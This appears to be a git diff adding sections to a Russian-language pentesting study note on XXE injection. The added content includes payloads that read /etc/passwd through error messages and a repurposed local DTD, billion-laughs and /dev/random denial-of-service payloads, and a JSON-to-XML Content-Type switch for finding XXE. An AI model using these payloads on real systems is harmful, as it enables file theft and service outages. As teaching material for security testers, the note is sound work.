@@ -2,6 +2,8 @@ XXE реализуется путем внедрения в XML внешних �
 ## Источники информации
 - [PayloadAllTheThings XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 - Codeby Academy WAPT
+## Инструменты
+- [dtd-finder](https://github.com/GoSecure/dtd-finder/tree/master/list) - поиск файлов DTD в файлов системе
 ## Общая информация
 Пример XML: 
 ```XML
@@ -64,6 +66,11 @@ General entity или обычные сущности – это сущност�
 <!ENTITY injected "Значение из внешнего файла">
 ```
 После подключения `%ent;` сущность `&injected;` становится доступной в основном документе.
+## Где искать XXE
+Основные места: 
+- прямая загрузка XML-файла; 
+- приложение использует обмен сообщениями по протоколу SOAP; 
+- аутентификация и авторизация через использование SAML.
 ## Типы атак
 ### Чтение файлов
 С помощью XXE возможно читать файлы на сервере. 
@@ -175,3 +182,102 @@ fclose($file); // закрываем файл
 `java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`.
 ##### Internal (System) DTD
 Атака используется, когда отсутствует доступ к внешней сети или firewall блокирует обращения к внешним ресурсам. Атака возможна, если DTD документа одновременно использует и внутренние, и внешние объявления DTD. Это позволяет внутреннему DTD переопределить сущности, которые объявлены во внешнем DTD. Внешний DTD необходим, так как внутренний DTD не позволяет сущности включать в себя другую сущность.
+Cущность-параметр `eval` использует сущность `%file`:
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE message [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<data></data>
+```
+После выполнения будет выведена ошибка: 
+```
+Internal Error: SAX Parser Error. Detail: The parameter entity reference “%file;” cannot occur within markup in the internal subset of the DTD.
+```
+Cсылка на объект `%file` не может встречаться в разметке другой сущности во внутреннем DTD.
+Для решения этой проблемы можно вместо внешнего DTD найти на веб-сервере подходящий DTD, потом переопределить сущность из внешнего DTD во внутреннем DTD. При определении сущностей с одинаковыми именами будет использоваться только первая. 
+Предположим, у нас есть `app.dtd` файл на исследуемом веб-сервере, в котором есть строки:
+```XML
+<!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">
+<!ELEMENT pattern (%condition;)>
+```
+Для переопределения была выбрана сущность-параметр `condition`.
+Рассмотрим пример внутреннего DTD, в котором загружается внешний DTD с того же веб-сервера, куда отправляется внутренний DTD. В этом случае, даже при отсутствии доступа к внешней сети или при наличии блокировки firewall, можно загрузить указанный файл.
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE message [
+ <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/app.dtd">
+ <!ENTITY % condition 'aaa)>
+ <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+ <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
+&#x27;file:///nonexistent/&#x25;file;&#x27;>">
+ &#x25;eval;
+ &#x25;error;
+ <!ELEMENT aa (bb'>
+ %local_dtd;
+]>
+<message>any text</message>
+```
+Описание файла:
+1. Объявляется сущность-параметр `local_dtd`, указывающая на внешний DTD файл. 
+2. Переопределяется (т.к. она уже существует в `app.dtd`) сущность-параметр `condition`, внутри нее создаются две сущности `file` и `eval`. 
+3. Сущность-параметр `file` указывает на файл `/etc/passwd` 
+4. Сущность параметр `eval` создает другую сущность-параметр `error`, которая вызывает ошибку как в предыдущем примере в External DTD. 
+5. Далее вызывается `%local_dtd;` и добавляется к текущему документу. 
+6. При обработке XML выполнит тег, в результате чего выполнится переопределенная сущность-параметр `condition` и вернет ошибку с содержимым файла `/etc/passwd`
+Полезно проверить наличие DTD файлов внутри веб-сервера с целью раскрутить XXE-атаку. Подробнее с наиболее часто встречаемыми DTD файлами можно познакомиться в репозитории [dtf-finder](https://github.com/GoSecure/dtd-finder/tree/master/list).
+### DoS через XXE
+#### Billion Laugh Attack
+DoS возникает, когда XML-анализатор пытается рекурсивно расширить сущности, что приводит к значительному потреблению памяти и процессора, в результате приложение станет неработоспособным. 
+Пример пейлоада:
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+```
+#### DoS через чтение файла
+Чтение `/dev/random` приводит к зависанию или бесконечному потреблению ресурсов. 
+Пример пейлоада:
+```XML
+<?xml version="1.0" ?>
+<!DOCTYPE test [ <!ENTITY dos SYSTEM "file:///dev/random
+```
+#### Манипуляции с заголовком Content-Type
+Часир для обмена данными между клиентом и сервером используется формат JSON. Однако из соображений совместимости или по причине архитектурных особенностей backend может по-прежнему поддерживать XML, даже если это не отображается явно во внешнем интерфейсе. Если заголовок Content-Type изменить на `application/xml`, клиент сообщает серверу, что в теле запроса содержатся данные в формате XML. 
+Запрос с JSON:
+```HTTP
+POST /req HTTP/1.1 
+Host: localhost 
+Accept: application/json 
+Content-Type: application/json 
+Content-Length: 38 
+
+{
+"option":"message",
+"value":"hello"
+}
+```
+Запрос с XML вместо JSON
+```HTTP
+POST /req HTTP/1.1
+Host: localhost
+Accept: application/json
+Content-Type: application/xml
+Content-Length: 112
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<root>
+ <option>message</option>
+ <value>hello</value>
+</root>
+```
+Если сервер принимает XML вместо JSON, можно тестировать XXE-атаку.
